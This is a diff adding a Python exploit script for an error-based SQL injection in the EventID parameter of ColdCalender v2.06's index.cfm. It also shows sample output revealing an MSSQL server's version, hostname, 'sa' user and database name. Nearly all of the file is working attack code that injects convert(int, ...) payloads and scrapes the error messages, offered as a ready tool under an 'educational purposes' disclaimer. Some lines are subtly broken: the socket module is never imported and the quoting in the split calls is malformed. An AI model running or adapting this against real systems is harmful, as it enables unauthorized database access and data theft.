@@ -1,0 +1,122 @@
+#!/usr/bin/python
+# ColdGen - coldcalender v2.06 Remote 0day SQL Injection Exploit
+# Vendor: http://www.coldgen.com/
+# Found by: mr_me
+# ----------------------------------------------->
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# ----------------------------------------------->
+# The vulnerability:
+# ===================
+# - SQL Injection in the index.cfm using parameters: EventID
+#
+# This tool assumes the target has a MSSQL backend.
+# ./ColdCal0day.py -p localhost:8080 -t localhost:8500 -d /coldcal/
+#
+# 	| ----------------------------------------------------------- |
+# 	|  -= ColdCalender v2.06 Remote 0day SQL Injection Exploit =- |
+# 	| --------------[ by mr_me - net-ninja.net ]----------------- |
+# 
+# (+) Exploiting target @: http://localhost:8500/coldcal/
+#
+# (+) Testing Proxy...
+# (+) Proxy @ localhost:8080
+# (+) Building Handler..
+# 
+# (!) Found database version: 
+# 
+# 	Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
+# 	Aug  19 2006 20:47:07 
+# 	Copyright (c) 1988-2005 Microsoft Corporation
+# 	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+#
+# (!) Found database hostname: 127.0.0.1
+#
+# (!) Found database user: sa
+#
+# (!) Found database name: coldcal
+
+import sys, httplib, urllib2, urllib, re
+from optparse import OptionParser
+
+usage = "./%prog [<options>] -t [target] -d [directory]"
+usage += "\nExample: ./%prog -p localhost:8080 -t localhost:8500 -d /coldcal/"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP Proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The Target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="directory",
+                  help="Directory path to the CMS")
+(options, args) = parser.parse_args()
+
+def banner():
+    print "\n\t| ----------------------------------------------------------- |"
+    print "\t|  -= ColdCalender v2.06 Remote 0day SQL Injection Exploit =- |"
+    print "\t| --------------[ by mr_me - net-ninja.net ]----------------- |\n"
+
+if len(sys.argv) < 5:
+	banner()
+	parser.print_help()
+	sys.exit(1)
+
+def getProxy():
+	try:
+		pr = httplib.HTTPConnection(options.proxy)
+		pr.connect()
+		proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
+	except(socket.timeout):
+		print "\n(-) Proxy Timed Out"
+		sys.exit(1)
+	except(),msg:
+		print "\n(-) Proxy Failed"
+		sys.exit(1)
+	return proxy_handler
+
+def setTargetHTTP():
+	if options.target[0:7] != 'http://':
+		options.target = "http://" + options.target
+	return options.target
+	
+def getRequest(exploit):
+	if options.proxy:
+		try:
+			proxyfier = urllib2.build_opener(getProxy())
+			check = proxyfier.open(options.target+options.directory+exploit).read()
+		except urllib2.HTTPError, error:
+			check = error.read()
+		except socket.error:
+			print "(-) Proxy connection failed"
+			sys.exit(1)
+	else:
+		try:
+			req = urllib2.Request(options.target+options.directory+exploit)
+			check = urllib2.urlopen(req).read()
+		except urllib2.HTTPError, error:
+			check = error.read()
+		except urllib2.URLError:
+			print "(-) Target connection failed, check your address"
+			sys.exit(1)
+	return check
+
+basicInfo = {'user: ':'user_name()', 'name: ':'db_name()', 'hostname: ':'host_name()','version: \n\n\t':'@@version'}
+
+def basicSploit(info):
+	return "index.cfm?fuseaction=ViewEventDetails&EventID=1+and+1=convert(int," + info + ")--"
+
+if __name__ == "__main__":
+	banner()
+	options.target = setTargetHTTP()
+	print "(+) Exploiting target @: %s" % (options.target+options.directory)
+	if options.proxy:
+		print "\n(+) Testing Proxy..."
+		print "(+) Proxy @ %s" % (options.proxy)
+		print "(+) Building Handler.."
+
+	for key in basicInfo:
+		getResp = getRequest(basicSploit(basicInfo[key]))
+		if re.findall("the nvarchar value '", getResp):
+			dbInfo = getResp.split('the nvarchar value '')[1].split('' to data type int')[0]
+			print "\n(!) Found database %s%s" % (key, dbInfo.rstrip())		
